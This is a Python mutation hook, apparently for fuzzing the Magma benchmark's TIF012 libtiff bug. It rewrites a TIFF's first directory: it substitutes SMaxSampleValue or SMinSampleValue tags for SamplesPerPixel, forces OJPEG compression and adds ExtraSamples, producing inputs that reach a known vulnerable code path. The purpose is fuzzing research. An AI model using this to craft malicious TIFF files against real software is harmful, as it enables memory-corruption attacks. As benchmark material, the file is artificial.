#!/usr/bin/env python3
"""Typed FORMTRIG mutation hook for Magma TIF012.

The TIF012 trigger is order/state dependent: libtiff must observe state from
SMinSampleValue or SMaxSampleValue before SamplesPerPixel is changed from its
default single-sample state. Plain byte flips rarely make a well-formed IFD with
that ordering, so this hook rewrites the first-IFD pointer to a new IFD appended
at EOF and inserts the missing producer-state context while omitting
SamplesPerPixel. libtiff reads SamplesPerPixel before the normal directory pass
whenever the tag is present, so the useful producer state must be installed
first and then let libtiff's missing-SamplesPerPixel recovery set the value
later. That recovery path is OJPEG-specific, so the fallback also coerces
Compression to OJPEG. When the seed already has the vulnerable ExtraSamples then
SamplesPerPixel shape, the hook first tries the smaller in-place tag
substitution observed in replayed baseline triggers: rewrite SamplesPerPixel to
SMaxSampleValue while preserving the surrounding directory context.
"""

from __future__ import annotations

import struct
import sys
from dataclasses import dataclass


TIFFTAG_SAMPLESPERPIXEL = 277
TIFFTAG_COMPRESSION = 259
TIFFTAG_EXTRASAMPLES = 338
TIFFTAG_SMINSAMPLEVALUE = 340
TIFFTAG_SMAXSAMPLEVALUE = 341
TIFF_SHORT = 3
COMPRESSION_OJPEG = 6


@dataclass(frozen=True)
class TiffEntry:
    tag: int
    typ: int
    count: int
    value: int


def parse_tiff(data: bytes) -> tuple[str, int, list[TiffEntry], int] | None:
    if len(data) < 8:
        return None
    if data[:2] == b"II":
        endian = "<"
    elif data[:2] == b"MM":
        endian = ">"
    else:
        return None
    if struct.unpack(endian + "H", data[2:4])[0] != 42:
        return None
    first_ifd = struct.unpack(endian + "I", data[4:8])[0]
    if first_ifd + 2 > len(data):
        return None
    entry_count = struct.unpack(endian + "H", data[first_ifd : first_ifd + 2])[0]
    table_end = first_ifd + 2 + entry_count * 12 + 4
    if table_end > len(data):
        return None

    entries: list[TiffEntry] = []
    for idx in range(entry_count):
        pos = first_ifd + 2 + idx * 12
        tag, typ, count, value = struct.unpack(endian + "HHII", data[pos : pos + 12])
        entries.append(TiffEntry(tag, typ, count, value))
    next_ifd = struct.unpack(endian + "I", data[table_end - 4 : table_end])[0]
    return endian, first_ifd, entries, next_ifd


def pack_entry(endian: str, entry: TiffEntry) -> bytes:
    return struct.pack(endian + "HHII", entry.tag, entry.typ, entry.count, entry.value)


def inline_short(endian: str, value: int) -> int:
    if endian == "<":
        return value & 0xFFFF
    return (value & 0xFFFF) << 16


def has_tag(entries: list[TiffEntry], tag: int) -> bool:
    return any(entry.tag == tag for entry in entries)


def rewrite_existing_spp_to_sample_value(data: bytes, op: int) -> bytes | None:
    parsed = parse_tiff(data)
    if parsed is None:
        return None
    endian, first_ifd, entries, _next_ifd = parsed
    if has_tag(entries, TIFFTAG_SMAXSAMPLEVALUE) or has_tag(
        entries, TIFFTAG_SMINSAMPLEVALUE
    ):
        return None

    compression_idx = next(
        (idx for idx, entry in enumerate(entries) if entry.tag == TIFFTAG_COMPRESSION),
        None,
    )
    if compression_idx is None:
        return None

    seen_extra = False
    for idx, entry in enumerate(entries):
        if entry.tag == TIFFTAG_EXTRASAMPLES:
            seen_extra = True
            continue
        if entry.tag != TIFFTAG_SAMPLESPERPIXEL:
            continue
        if not seen_extra:
            return None
        replacement = (
            TIFFTAG_SMAXSAMPLEVALUE if op % 2 == 0 else TIFFTAG_SMINSAMPLEVALUE
        )
        rewritten = bytearray(data)
        pos = first_ifd + 2 + idx * 12
        rewritten[pos : pos + 2] = struct.pack(endian + "H", replacement)
        compression_pos = first_ifd + 2 + compression_idx * 12
        rewritten[compression_pos : compression_pos + 12] = pack_entry(
            endian,
            TiffEntry(
                TIFFTAG_COMPRESSION,
                TIFF_SHORT,
                1,
                inline_short(endian, COMPRESSION_OJPEG),
            ),
        )
        return bytes(rewritten)
    return None


def build_tif012_candidate(data: bytes, op: int, sample: int) -> bytes | None:
    in_place = rewrite_existing_spp_to_sample_value(data, op)
    if in_place is not None:
        return in_place

    parsed = parse_tiff(data)
    if parsed is None:
        return None
    endian, _first_ifd, entries, next_ifd = parsed

    pad = b"\x00" if len(data) % 2 else b""
    new_ifd_offset = len(data) + len(pad)

    insert_at = min(len(entries), 4)
    rewritten_entries: list[TiffEntry] = []
    replaced_spp = False
    replacement_tag = (
        TIFFTAG_SMAXSAMPLEVALUE if op % 2 == 0 else TIFFTAG_SMINSAMPLEVALUE
    )
    replacement_entry = TiffEntry(
        replacement_tag, TIFF_SHORT, 1, inline_short(endian, 3 if op % 2 == 0 else 0)
    )
    for idx, entry in enumerate(entries):
        if entry.tag == TIFFTAG_SAMPLESPERPIXEL and not (
            has_tag(entries, TIFFTAG_SMAXSAMPLEVALUE)
            or has_tag(entries, TIFFTAG_SMINSAMPLEVALUE)
        ):
            insert_at = idx
            if not has_tag(entries, replacement_tag):
                rewritten_entries.append(replacement_entry)
            replaced_spp = True
            continue
        rewritten_entries.append(entry)

    state_entries: list[TiffEntry] = []
    if not has_tag(entries, TIFFTAG_COMPRESSION):
        state_entries.append(
            TiffEntry(
                TIFFTAG_COMPRESSION,
                TIFF_SHORT,
                1,
                inline_short(endian, COMPRESSION_OJPEG),
            )
        )
    if not has_tag(entries, TIFFTAG_EXTRASAMPLES):
        state_entries.append(
            TiffEntry(TIFFTAG_EXTRASAMPLES, TIFF_SHORT, 1, inline_short(endian, 1))
        )
    if not replaced_spp and not has_tag(entries, replacement_tag):
        state_entries.append(replacement_entry)

    rewritten_entries = [
        (
            TiffEntry(
                TIFFTAG_COMPRESSION,
                TIFF_SHORT,
                1,
                inline_short(endian, COMPRESSION_OJPEG),
            )
            if entry.tag == TIFFTAG_COMPRESSION
            else entry
        )
        for entry in rewritten_entries
    ]
    rewritten_entries = (
        rewritten_entries[:insert_at] + state_entries + rewritten_entries[insert_at:]
    )

    header = bytearray(data)
    header[4:8] = struct.pack(endian + "I", new_ifd_offset)

    new_ifd = bytearray()
    new_ifd += struct.pack(endian + "H", len(rewritten_entries))
    for entry in rewritten_entries:
        new_ifd += pack_entry(endian, entry)
    new_ifd += struct.pack(endian + "I", next_ifd)

    return bytes(header) + pad + bytes(new_ifd)


def main(argv: list[str]) -> int:
    if len(argv) < 15:
        return 2
    orig_path, mut_path, out_path = argv[1], argv[2], argv[3]
    op = int(argv[8])
    sample = int(argv[9])

    with open(orig_path, "rb") as handle:
        original = handle.read()
    with open(mut_path, "rb") as handle:
        mutated = handle.read()

    candidate = build_tif012_candidate(original, op, sample)
    if candidate is None:
        candidate = mutated

    with open(out_path, "wb") as handle:
        handle.write(candidate)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
